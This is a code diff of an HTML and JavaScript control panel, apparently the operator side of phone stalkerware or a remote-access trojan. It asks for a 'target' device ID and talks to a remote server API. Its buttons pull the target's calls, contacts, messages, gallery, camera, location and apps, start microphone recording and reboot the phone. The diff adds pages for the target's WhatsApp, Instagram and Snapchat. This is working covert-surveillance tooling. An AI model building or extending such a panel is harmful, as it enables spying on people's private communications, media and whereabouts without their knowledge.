@@ -8,12 +8,13 @@
     <style>
         :root {
             --bg-dark: #000000;
-            --glass-panel: rgba(30, 30, 30, 0.75);
+            --glass-panel: rgba(30, 30, 30, 0.85);
             --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
             --text-sub: #b0b0b0;
             --slider-bg: rgba(60, 60, 60, 0.6);
             --slider-fill: rgba(255, 255, 255, 1);
+            --accent: #0a84ff;
         }
 
         body {
@@ -24,65 +25,57 @@
             background-attachment: fixed;
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            margin: 0; 
-            padding: 20px;
-            display: flex; 
-            justify-content: center;
-            align-items: center;
+            margin: 0; padding: 20px;
+            display: flex; justify-content: center; align-items: center;
             min-height: 100vh;
-            backdrop-filter: blur(30px);
-            overscroll-behavior: none;
+            backdrop-filter: blur(20px);
+            -webkit-tap-highlight-color: transparent;
         }
 
+        /* --- ID POPUP (Sirf tab dikhega jab ID nahi hogi) --- */
+        .id-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 9999;
+            display: flex; justify-content: center; align-items: center; flex-direction: column;
+        }
+        .id-box {
+            background: #222; padding: 25px; border-radius: 20px; text-align: center;
+            border: 1px solid #444; width: 80%; max-width: 300px;
+        }
+        .id-box input {
+            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #555;
+            background: #111; color: #fff; text-align: center; margin: 15px 0; outline: none;
+            font-size: 1.1rem; box-sizing: border-box; text-transform: uppercase;
+        }
+        .id-box button {
+            width: 100%; padding: 12px; background: var(--accent); color: white; border: none;
+            border-radius: 10px; font-weight: bold; font-size: 1rem; cursor: pointer;
+        }
+
+        /* --- MAIN DASHBOARD --- */
         .container {
-            width: 100%;
-            max-width: 420px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 45px;
-            padding: 25px;
+            width: 100%; max-width: 420px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 40px; padding: 25px;
             border: 1px solid var(--glass-border);
             box-shadow: 0 30px 60px rgba(0,0,0,0.6);
-            position: relative;
         }
 
-        /* --- Header --- */
+        /* Header (Clean, ID hidden basically) */
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 25px;
-            padding: 0 5px;
+            margin-bottom: 20px; padding: 0 10px;
         }
-        .device-info h2 { margin: 0; font-size: 1.3rem; font-weight: 600; letter-spacing: 0.5px; }
-        .device-info p { margin: 3px 0 0 0; font-size: 0.8rem; color: var(--text-sub); display: flex; align-items: center; gap: 6px; }
-        
-        .status-pill {
-            background: rgba(255,255,255,0.15);
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            display: flex; align-items: center; gap: 6px;
-            border: 1px solid var(--glass-border);
-            backdrop-filter: blur(10px);
-            cursor: pointer;
-        }
-        .dot { width: 8px; height: 8px; background: #4caf50; border-radius: 50%; box-shadow: 0 0 8px #4caf50; }
-        .dot.offline { background: #ff4444; box-shadow: 0 0 8px #ff4444; }
+        .device-info h2 { margin: 0; font-size: 1.4rem; font-weight: 600; }
+        .device-info p { margin: 4px 0 0 0; font-size: 0.8rem; color: var(--text-sub); }
 
-        /* --- Info Card --- */
-        .info-card {
-            background: var(--glass-panel);
-            border-radius: 25px;
-            padding: 20px;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.8rem;
-            border: 1px solid var(--glass-border);
+        .status-dot {
+            width: 10px; height: 10px; background: #ff4444; border-radius: 50%;
+            box-shadow: 0 0 10px #ff4444; transition: 0.3s;
         }
-        .info-col { display: flex; flex-direction: column; gap: 5px; }
-        .label { color: var(--text-sub); font-size: 0.7rem; letter-spacing: 1px; text-transform: uppercase; }
-        .value { font-weight: 600; font-size: 0.95rem; }
+        .status-dot.online { background: #4caf50; box-shadow: 0 0 10px #4caf50; }
 
-        /* --- GRID LAYOUT --- */
+        /* GRID SYSTEM */
         .controls-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -94,189 +87,124 @@
         .btn-card {
             background: var(--glass-panel);
             border-radius: 22px;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
             border: 1px solid var(--glass-border);
-            cursor: pointer;
+            cursor: pointer; position: relative;
             transition: 0.1s;
-            text-decoration: none; color: white;
-            position: relative; overflow: hidden;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
         }
-        .btn-card:active { transform: scale(0.92); background: rgba(80, 80, 80, 0.8); }
-        
-        .btn-card i { font-size: 1.6rem; margin-bottom: 8px; }
+        .btn-card:active { transform: scale(0.95); background: rgba(80, 80, 80, 0.9); }
+        .btn-card i { font-size: 1.5rem; margin-bottom: 8px; color: #fff; }
         .btn-card span { font-size: 0.65rem; color: var(--text-sub); font-weight: 500; }
+        
+        /* Active State (Torch) */
+        .btn-card.active { background: #fff; }
+        .btn-card.active i, .btn-card.active span { color: #000; }
 
-        .btn-card.active { background: rgba(255, 255, 255, 1); color: #000; box-shadow: 0 0 15px rgba(255,255,255,0.4); }
-        .btn-card.active span { color: #333; }
-
-        /* --- SLIDERS --- */
+        /* SLIDERS (Vertical) */
         .slider-card {
-            grid-row: span 2;
+            grid-row: span 2; /* Height 2 blocks */
             background: var(--slider-bg);
             border-radius: 25px;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
+            position: relative; overflow: hidden;
+            display: flex; align-items: flex-end; justify-content: center;
             border: 1px solid var(--glass-border);
-            touch-action: none; 
         }
-
         .slider-fill {
-            position: absolute;
-            bottom: 0; left: 0; right: 0;
-            background: var(--slider-fill);
-            width: 100%;
-            height: 50%;
-            transition: height 0.1s linear;
-            pointer-events: none;
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: var(--slider-fill); width: 100%; height: 50%;
+            pointer-events: none; transition: height 0.1s;
         }
-
         .slider-icon {
-            position: absolute;
-            bottom: 25px;
-            font-size: 1.6rem;
-            z-index: 5;
-            color: #555;
-            transition: color 0.2s;
-            pointer-events: none;
+            position: absolute; bottom: 25px; font-size: 1.5rem; z-index: 2;
+            color: #555; pointer-events: none;
         }
-
         .vertical-range {
-            position: absolute;
-            width: 200px; 
-            height: 100%;
-            top: 0; left: 50%;
-            transform: translate(-50%, 0) rotate(-90deg);
-            opacity: 0;
-            cursor: ns-resize;
-            z-index: 10;
-            touch-action: none;
+            position: absolute; width: 200px; height: 100%;
+            top: 0; left: 50%; transform: translate(-50%, 0) rotate(-90deg);
+            opacity: 0; cursor: ns-resize; z-index: 10;
         }
 
-        /* --- ID INPUT OVERLAY --- */
-        .id-input-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); 
-            backdrop-filter: blur(15px);
-            z-index: 9999;
-            display: flex;
-            justify-content: center; align-items: center; flex-direction: column;
-        }
-        .id-input-box {
-            background: rgba(30,30,30,0.9); padding: 30px; border-radius: 25px; text-align: center;
-            border: 1px solid rgba(255,255,255,0.2); width: 80%; max-width: 300px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        }
-        .id-input-box h3 { margin-top: 0; color: #fff; font-weight: 500; }
-        .id-input-box input {
-            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #444; 
-            background: #111; color: #fff; font-size: 1.1rem; text-align: center;
-            text-transform: uppercase; margin: 15px 0; outline: none; box-sizing: border-box;
-        }
-        .id-input-box input:focus { border-color: #0a84ff; }
-        .id-input-box button {
-            width: 100%; padding: 12px; background: #0a84ff; color: white; 
-            border: none; border-radius: 12px; cursor: pointer; font-size: 1rem; font-weight: 600;
-        }
-        .id-input-box button:active { opacity: 0.8; }
-
+        /* Reset Button (Small hidden option) */
+        .reset-btn { font-size: 0.7rem; color: #555; text-decoration: underline; margin-top: 5px; cursor: pointer;}
     </style>
 </head>
 <body>
 
-    <div id="idOverlay" class="id-input-overlay">
-        <div class="id-input-box">
-            <h3>Enter Device ID</h3>
-            <p style="color:#aaa; font-size:0.8rem;">To connect with the target phone</p>
-            <input type="text" id="idInput" placeholder="ex: 947239">
-            <button onclick="saveID()">Connect</button>
+    <div id="idOverlay" class="id-overlay" style="display:none;">
+        <div class="id-box">
+            <h3 style="color:#fff; margin-top:0;">Enter Device ID</h3>
+            <input type="text" id="idInput" placeholder="Enter ID here">
+            <button onclick="saveID()">CONNECT</button>
         </div>
     </div>
 
     <div class="container">
         <div class="header">
             <div class="device-info">
-                <h2 id="deviceName">Waiting...</h2>
-                <p><i class="fa-solid fa-battery-half"></i> <span id="batteryPercent">--%</span> &bull; v<span id="androidVer">--</span></p>
+                <h2 id="modelName">Device</h2>
+                <p>Battery: <span id="batLevel">--%</span> &bull; <span id="netStatus">Offline</span></p>
+                <div class="reset-btn" onclick="resetID()">Change ID</div>
             </div>
-            <div class="status-pill" onclick="resetID()">
-                <div class="dot" id="statusDot"></div>
-                <span id="statusText">Connecting</span>
-            </div>
-        </div>
-
-        <div class="info-card">
-            <div class="info-col">
-                <span class="label">Network</span>
-                <span class="value" id="networkType">--</span>
-            </div>
-            <div class="info-col">
-                <span class="label">Charging</span>
-                <span class="value" id="batteryStatus">--</span>
-            </div>
-            <div class="info-col">
-                <span class="label">ID</span>
-                <span class="value" id="displayID" style="color:#0a84ff">--</span>
-            </div>
+            <div class="status-dot" id="onlineDot"></div>
         </div>
 
         <div class="controls-grid">
             
-            <div onclick="openView('call_logs')" class="btn-card"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
-            <div onclick="openView('contacts')" class="btn-card"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
-            <div onclick="openView('sms')" class="btn-card"><i class="fa-solid fa-comments"></i><span>Messages</span></div>
+            <div onclick="openPage('call_logs')" class="btn-card"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
+            <div onclick="openPage('contacts')" class="btn-card"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
+            <div onclick="openPage('sms')" class="btn-card"><i class="fa-solid fa-comments"></i><span>Messages</span></div>
             <div onclick="toggleTorch()" id="torchBtn" class="btn-card"><i class="fa-solid fa-flashlight"></i><span>Torch</span></div>
 
-            <div onclick="openView('gallery')" class="btn-card"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
-            <div onclick="openView('camera')" class="btn-card"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
+            <div onclick="openPage('gallery')" class="btn-card"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
+            <div onclick="openPage('camera')" class="btn-card"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
             
             <div class="slider-card">
-                <div class="slider-fill" id="brightFill" style="height: 50%;"></div>
+                <div class="slider-fill" id="brightFill"></div>
                 <i class="fa-solid fa-sun slider-icon" id="brightIcon"></i>
                 <input type="range" min="0" max="100" value="50" class="vertical-range" 
-                       oninput="updateSlider('bright', this.value)" 
-                       onchange="sendSliderCmd('brightness', this.value)">
+                       oninput="updateSliderUI('bright', this.value)" 
+                       onchange="sendCmd('brightness:'+this.value)">
             </div>
 
             <div class="slider-card">
-                <div class="slider-fill" id="volFill" style="height: 50%;"></div>
+                <div class="slider-fill" id="volFill"></div>
                 <i class="fa-solid fa-volume-high slider-icon" id="volIcon"></i>
                 <input type="range" min="0" max="100" value="50" class="vertical-range" 
-                       oninput="updateSlider('vol', this.value)" 
-                       onchange="sendSliderCmd('volume', this.value)">
+                       oninput="updateSliderUI('vol', this.value)" 
+                       onchange="sendCmd('volume:'+this.value)">
             </div>
 
-            <div class="btn-card"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
+            <div onclick="openDirectPage('whatsapp.html')" class="btn-card"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
+            <div onclick="openDirectPage('instagram.html')" class="btn-card"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
             
-            <div onclick="openView('notifications')" class="btn-card"><i class="fa-regular fa-message"></i><span>Notify</span></div>
+            <div onclick="openDirectPage('snap.html')" class="btn-card"><i class="fa-brands fa-snapchat"></i><span>Snapchat</span></div>
             
-            <div onclick="openView('location')" class="btn-card"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
-            <div onclick="openView('apps')" class="btn-card"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
-            <div onclick="sendCommand('rec_start')" class="btn-card"><i class="fa-solid fa-microphone-lines"></i><span>Record</span></div>
-            <div onclick="sendCommand('reboot')" class="btn-card"><i class="fa-solid fa-power-off"></i><span>Power</span></div>
+            <div onclick="cycleSound()" class="btn-card" id="soundBtn">
+                <i class="fa-solid fa-bell" id="soundIcon"></i>
+                <span id="soundLabel">Normal</span>
+            </div>
+            
+            <div onclick="openPage('location')" class="btn-card"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
+            <div onclick="openPage('apps')" class="btn-card"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
+            <div onclick="sendCmd('rec_start')" class="btn-card"><i class="fa-solid fa-microphone-lines"></i><span>Record</span></div>
+            <div onclick="sendCmd('reboot')" class="btn-card"><i class="fa-solid fa-power-off"></i><span>Power</span></div>
 
         </div>
     </div>
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
-        let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
-        let isTorchOn = false;
-
-        function checkID() {
+        let DEVICE_ID = localStorage.getItem('monitor_id');
+        
+        // --- ID Management ---
+        function checkAuth() {
             if(!DEVICE_ID) {
-                document.getElementById('idOverlay').style.display = 'flex';
-                document.querySelector('.container').style.filter = 'blur(5px)';
+                document.getElementById('idOverlay').style.display = 'flex'; // Show Popup
+                document.querySelector('.container').style.filter = 'blur(10px)';
             } else {
-                document.getElementById('idOverlay').style.display = 'none';
+                document.getElementById('idOverlay').style.display = 'none'; // Hide Popup
                 document.querySelector('.container').style.filter = 'none';
-                document.getElementById('displayID').innerText = DEVICE_ID;
-                updateDashboard();
+                startPolling();
             }
         }
 
@@ -284,97 +212,105 @@
             const val = document.getElementById('idInput').value.trim().toUpperCase();
             if(val) {
                 DEVICE_ID = val;
-                localStorage.setItem('monitoring_id', DEVICE_ID);
-                checkID();
-            } else {
-                alert("Please enter a valid ID");
+                localStorage.setItem('monitor_id', DEVICE_ID);
+                checkAuth();
             }
         }
 
         function resetID() {
-            if(confirm("Change Device ID?")) {
-                localStorage.removeItem('monitoring_id');
-                DEVICE_ID = '';
+            if(confirm("Change Target Device ID?")) {
+                localStorage.removeItem('monitor_id');
                 location.reload();
             }
         }
 
-        function updateSlider(type, val) {
-            document.getElementById(`${type}Fill`).style.height = val + "%";
-            const icon = document.getElementById(`${type}Icon`);
-            if(val > 25) {
-                icon.style.color = "#333"; 
-            } else {
-                icon.style.color = "#fff";
-            }
-        }
-
-        function sendSliderCmd(cmdType, val) {
-            console.log(`Sending ${cmdType}: ${val}`);
-            sendCommand(`${cmdType}:${val}`);
-        }
-
-        function toggleTorch() {
-            isTorchOn = !isTorchOn;
-            const btn = document.getElementById('torchBtn');
-            if(isTorchOn) {
-                btn.classList.add('active');
-                sendCommand('torch_on');
-            } else {
-                btn.classList.remove('active');
-                sendCommand('torch_off');
-            }
-        }
-
-        function openView(page) {
-            if(!DEVICE_ID) return;
-            // Clean simple redirect
+        // --- Navigation Logic ---
+        function openPage(page) {
+            // Normal pages like call logs, sms etc
             window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
         }
 
-        function sendCommand(action) {
+        function openDirectPage(filename) {
+            // Social Media pages (whatsapp.html, snap.html, etc)
+            window.location.href = `${filename}?id=${DEVICE_ID}`;
+        }
+
+        function sendCmd(cmd) {
             if(!DEVICE_ID) return;
             fetch(`${API_BASE}/api/send-command`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ device_id: DEVICE_ID, command: cmd })
             });
         }
 
-        function updateDashboard() {
-            if (!DEVICE_ID) return;
-            
-            fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
-                .then(res => res.json())
-                .then(data => {
-                    if(data.id) {
-                        document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
-                        document.getElementById('androidVer').innerText = data.version || "--";
-                        document.getElementById('batteryPercent').innerText = (data.battery || 0) + "%";
-                        document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging" : "Discharging";
-                        document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Offline";
-                        
-                        const dot = document.getElementById('statusDot');
-                        const txt = document.getElementById('statusText');
-                        
-                        if(data.isOnline) {
-                            dot.style.background = "#4caf50";
-                            dot.style.boxShadow = "0 0 8px #4caf50";
-                            dot.classList.remove('offline');
-                            txt.innerText = "Connected";
-                        } else {
-                            dot.style.background = "#ff4444";
-                            dot.style.boxShadow = "0 0 8px #ff4444";
-                            dot.classList.add('offline');
-                            txt.innerText = "Offline";
-                        }
-                    }
-                })
-                .catch(e => console.log("Offline or Error"));
+        // --- UI Logic ---
+        let isTorch = false;
+        function toggleTorch() {
+            isTorch = !isTorch;
+            const btn = document.getElementById('torchBtn');
+            if(isTorch) {
+                btn.classList.add('active');
+                sendCmd('torch_on');
+            } else {
+                btn.classList.remove('active');
+                sendCmd('torch_off');
+            }
         }
 
-        setInterval(updateDashboard, 3000);
-        window.onload = checkID;
+        // Sound Cycle Logic (Normal -> Vibrate -> Silent)
+        let soundModes = ['normal', 'vibrate', 'silent'];
+        let soundIcons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
+        let soundLabels = ['Normal', 'Vibrate', 'Silent'];
+        let currentSound = 0;
+
+        function cycleSound() {
+            currentSound = (currentSound + 1) % 3;
+            // UI Update
+            document.getElementById('soundIcon').className = `fa-solid ${soundIcons[currentSound]}`;
+            document.getElementById('soundLabel').innerText = soundLabels[currentSound];
+            // Command Send
+            sendCmd(soundModes[currentSound]);
+        }
+
+        // Slider UI
+        function updateSliderUI(type, val) {
+            document.getElementById(`${type}Fill`).style.height = val + "%";
+            // Icon color change logic for better visibility
+            const icon = document.getElementById(`${type}Icon`);
+            icon.style.color = val > 30 ? "#333" : "#fff";
+        }
+
+        // --- Data Fetching ---
+        function startPolling() {
+            setInterval(() => {
+                fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
+                .then(r => r.json())
+                .then(d => {
+                    if(d.id) {
+                        document.getElementById('modelName').innerText = d.model || "Connected";
+                        document.getElementById('batLevel').innerText = (d.battery || 0) + "%";
+                        
+                        const dot = document.getElementById('onlineDot');
+                        const net = document.getElementById('netStatus');
+                        
+                        if(d.isOnline) {
+                            dot.classList.add('online');
+                            net.innerText = "Online";
+                            net.style.color = "#4caf50";
+                        } else {
+                            dot.classList.remove('online');
+                            net.innerText = "Offline";
+                            net.style.color = "#777";
+                        }
+                    }
+                }).catch(e => console.log(e));
+            }, 3000);
+        }
+
+        // Init
+        window.onload = checkAuth;
+
     </script>
 </body>
 </html>
